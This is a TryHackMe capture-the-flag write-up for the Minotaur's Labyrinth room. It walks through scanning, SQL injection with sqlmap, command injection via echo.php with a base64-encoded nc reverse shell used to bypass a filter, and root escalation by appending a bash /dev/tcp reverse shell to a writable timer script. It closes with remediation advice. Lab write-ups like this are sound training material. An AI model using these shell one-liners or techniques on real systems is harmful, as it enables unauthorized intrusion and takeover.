TryHackMe <br>
Minotaur's Labyrinth
---

# Reconnaissance/Scanning:
I started off by scanning the network to see which ports were open/services running on the ports.
```
$ nmap -A -O -sC -sV -p- <machine_IP>
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/e3821ce0-8661-4890-8462-f1e089b7ca8d)

 Running gobuster to scan for directories.
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/82fb896c-3c8d-44e8-b0cd-f1d094f7141f)

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/a4213c0d-75e6-4c02-b09b-6db1563df783)

In the FTP server there’s a directory to look into.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/32b30ca9-a7fd-4d9a-92ac-3d1dde5fd997)

In that directory was a hidden directory and a text file. The text file didn’t show anything important.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/12c6ceac-0a52-46a6-9d55-012dd1515dc6)
 
In the hidden directory was the first flag and another text file.
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/1397bd66-68a9-41d3-86a9-3185be56c559)
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/6b5baabe-ca37-4d3a-9dbe-26f2c40ffe16)

This is what the text file keep_in_mind said:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0617b694-d529-4786-8058-d5afb74c2bf0)
 
# Vulnerability assessment:
The /logs directory had a log file that showed some user credentials in plaintext!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/5b7941dd-c2e9-49a0-8b2d-e728edfecfdc)

Once logged in on the main webpage, there’s a search bar that looks like it is showing potential tables or columns from a database.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/35437d67-06c9-4c47-bec1-80a72f5ac87b)
 
I fired up burpsuite to capture a request after sending a parameter in the searchbar and used that in sqlmap.
```
$ sqlmap -r /path/to/request/file --batch –dump
```
Looks like we got some usernames and hashes!
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d9192b7c-f894-45fe-9e48-b40cb47870de)
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/9ac1013e-55fd-4594-835e-6b2349bd5b30)

Crackstation[.]net cracked them easily since they’re just an md5 hash!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/89fcb0be-0c66-482c-a24f-dd20830ad960)
 
Upon logging into the webpage, the top nav bar showed the second flag.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d5e3e0ad-7794-453a-b449-8a400c9e5c27)
 
When viewing the source code, I saw this comment.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/e112f819-f9cd-41bb-81d9-aa809c6660bf)
 
And up at the top, the “Secret_Stuff” link leads to /echo.php

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/ea224b45-47eb-4414-88e3-fbf42a025962)
 
# Exploit:
Visiting that page:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/ee70c242-0914-495e-9238-291481e3fdc1)
 
Thanks to the hint from TryHackMe, it let me know which characters are filtered.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/15c7de88-e4fc-44f1-9f48-862123c24987)
 
Luckily, it looks like the pipe character isn’t filtered, so I tested the command `whoami` piped to `bash` because just entering a command will get echoed.
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c0ca6b45-1d48-43b5-8ec3-30b4088e1b4d)
 
Since so many characters are filtered, I can’t use a regular command to try to get a reverse shell. <br>
That means I’ll have to encode it and try that way. Base64 is great for encoding. <br>
The reverse shell one liner I used was:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local_IP>  <PORT> >/tmp/f
```
I encoded that and removed the equal sign at the end since it was one of the filtered characters.
```
<encoded_text> | base64 -d | bash 
```
After sending that, I got a reverse shell!
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/93f3084e-7752-4802-bd3b-7b2cf828c2f2)

Checking for hidden files.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/ac7a23f3-c5e3-4154-aa2f-dbb52ac0456c)

That looks like a good file to inspect!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b56cffe3-a516-463b-8239-bde2f89e9da6)

Now to see the other users in the /home directory.
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/8e0d1fc9-da88-4230-9149-028afa2a6b71)
 
In this user’s home directory was the user flag.
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/4f3aaaf6-e629-4d36-ad4d-70c19c915773)
 
# Privilege Escalation:
Looking for a way to escalate privileges, I didn’t have any luck looking at the cronjobs,  <br>
no password so I couldn’t run `sudo -l`, and no SUID binaries I could exploit. <br>
I started checking for hidden files or anything useful in the root directory.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c0720a62-e7d0-4fbf-afc0-02098644c54c)
 
That’s interesting, a directory called timers that’s writable by all users. <br>
In one of the files on the FTP server there was mention of keeping things on a timer..

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b1a3e3f2-e395-4b3a-965f-66efba380e9f)
 
In that directory was a script that starts another bash shell. <br>
Well, since I can write to that file I appended a reverse shell one liner to the end of it.
```
$ echo “bash -i >& /dev/tcp/IP_ADDRESS/8080 0>&1” >> timer.sh
```
Shortly after that I got a reverse shell as root.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/ed2c4693-5d45-4d0e-a149-bd22b2c60bfa)
 
Time to grab the root flag in the root directory.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/73005585-05fe-4212-aed9-45cb57e89d07)
 
# Reporting:
•	Disable anonymous login on FTP servers. <br>
•	Check data sanitization/filtered expressions on webpages. <br>
•	Ensure correct permissions are assigned on all files, especially executable files. <br>
•	Don’t store credentials in plaintext. <br>
•	Use a stronger hashing algorithm in databases to protect information.



































